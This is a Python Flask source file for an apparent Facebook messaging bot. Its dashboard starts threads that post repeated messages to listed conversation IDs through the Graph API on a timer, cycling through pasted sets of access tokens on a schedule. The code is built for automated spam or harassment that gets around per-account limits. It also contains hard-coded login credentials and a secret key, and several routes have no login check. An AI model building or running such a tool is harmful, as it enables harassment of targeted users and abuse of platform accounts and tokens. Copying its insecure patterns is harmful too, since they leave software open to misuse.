from flask import Flask, render_template, request, redirect, url_for, session, jsonify

import os, threading, time, requests, uuid, json, pytz

from datetime import datetime

from collections import defaultdict

from threading import Lock

app = Flask(__name__)

app.secret_key = 'jack_monster_power_key'

app.config['UPLOAD_FOLDER'] = 'uploads'

tasks = {}  # task_id -> metadata

task_logs = defaultdict(list)  # task_id -> list of logs

chat_config = {}  # task_id -> chat dict (tokens, schedules etc.)

chat_locks = defaultdict(Lock)

def get_current_token_set(chat):

    pk_tz = pytz.timezone('Asia/Karachi')

    now = datetime.now(pk_tz)

    # Manual scheduling priority

    for tk_key, schedule in chat.get('token_schedules', {}).items():

        if schedule.get('enabled', False):

            start_str = schedule['start_time']

            start_dt = datetime.strptime(start_str, "%Y-%m-%dT%H:%M")

            if now >= pytz.timezone('Asia/Karachi').localize(start_dt):

                return tk_key

    # Auto-schedule fallback

    if chat.get('auto_schedule', {}).get('enabled', False):

        iv = int(chat['auto_schedule'].get('interval_hours', 8))

        h = now.hour

        token_keys = sorted([k for k in chat if k.startswith('tokenset_')])

        if token_keys:

            idx = (h // iv) % len(token_keys)

            return token_keys[idx]

    return 'tokens'  # fallback

def send_message(access_token, profile_id, message, task_id, token_num):

    url = f"https://graph.facebook.com/v23.0/t_{profile_id}"

    parameters = {'access_token': access_token, 'message': message}

    headers = {

        'User-Agent': 'Mozilla/5.0',

        'Accept-Language': 'en-US,en;q=0.9'

    }

    res = requests.post(url, data=parameters, headers=headers)

    with chat_locks[task_id]:

        task_logs[task_id].append({

            'timestamp': datetime.now(pytz.timezone('Asia/Karachi')).strftime("%Y-%m-%d %I:%M:%S %p"),

            'status': 'SENT' if res.ok else 'FAILED',

            'comment': message[:50],

            'target_id': profile_id,

            'token_number': token_num

        })

        task_logs[task_id] = task_logs[task_id][-200:]

    return res

def run_task(task_id):

    chat = chat_config[task_id]

    cfg = chat_config[task_id]

    start = time.time()

    tasks[task_id] = {'running': True, 'uptime': 0, 'stop_password': cfg['stop_password']}

    idxs = {tk: 0 for tk in cfg if tk.startswith('tokens')}

    midx = 0

    while tasks[task_id]['running']:

        tkkey = get_current_token_set(chat)

        tokens = chat.get(tkkey, [])

        profiles = chat.get('profile_ids', [])

        messages = chat.get('messages', [])

        if not tokens or not profiles or not messages:

            break

        # âœ… Append header before sending message

        header = chat.get('header', '')

        base_msg = messages[midx % len(messages)]

        msg = f"[{header}] {base_msg}" if header else base_msg

        toknum = (idxs[tkkey] % len(tokens)) + 1

        res = send_message(tokens[idxs[tkkey] % len(tokens)], profiles[midx % len(profiles)], msg, task_id, toknum)

        idxs[tkkey] += 1

        midx += 1

        tasks[task_id]['uptime'] = int(time.time() - start)

        time.sleep(float(chat.get('timer', 30)))

    tasks.pop(task_id, None)

@app.route('/')

def home():

    return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])

def login():

    if request.method == 'POST' and request.form['username'] == 'Steven Brand' and request.form['password'] == 'StevenBrandhere':

        session['logged_in'] = True

        return redirect('/dashboard')

    return render_template('login.html', error=None)

@app.route('/dashboard')

def dashboard():

    if not session.get('logged_in'):

        return redirect('/login')

    return render_template('dashboard.html', tasks=tasks)

@app.route('/start_task', methods=['POST'])

def start_task():

    convo_id = request.form['convo_id']

    header = request.form['header']

    interval = request.form['interval']

    stop_password = request.form['stop_password']

    messages = request.form['messages'].splitlines()

    profiles = convo_id.splitlines()

    d = {

        'header': header,

        'timer': interval,

        'stop_password': stop_password,

        'messages': messages,

        'profile_ids': profiles,

        'token_schedules': {}

    }

    if 'enable_auto' in request.form:

        d['auto_schedule'] = {

            'enabled': True,

            'interval_hours': request.form.get('auto_interval', '8')

        }

    token_set_keys = [key for key in request.form if key.startswith("tokenset_")]

    for key in token_set_keys:

        tokens_raw = request.form.get(key).strip()

        tokens = [t.strip() for t in tokens_raw.splitlines() if t.strip()]

        d[key] = tokens

    schedule_keys = [key for key in request.form if key.startswith("schedule_")]

    for key in schedule_keys:

        tkey = key.replace("schedule_", "tokenset_")

        start_time = request.form[key]

        d['token_schedules'][tkey] = {

            'enabled': True,

            'start_time': start_time

        }

    task_id = str(uuid.uuid4())[:8]

    chat_config[task_id] = d

    th = threading.Thread(target=run_task, args=(task_id,), daemon=True)

    th.start()

    return redirect('/dashboard')

@app.route('/stop_task/<task_id>', methods=['POST'])

def stop_task(task_id):

    if task_id in tasks and request.form['stop_password'] == tasks[task_id]['stop_password']:

        tasks[task_id]['running'] = False

    return redirect('/dashboard')

@app.route('/get_logs/<task_id>')

def get_logs(task_id):

    return jsonify(task_logs.get(task_id, []))

if __name__ == '__main__':

    app.run(host='0.0.0.0', port=20424)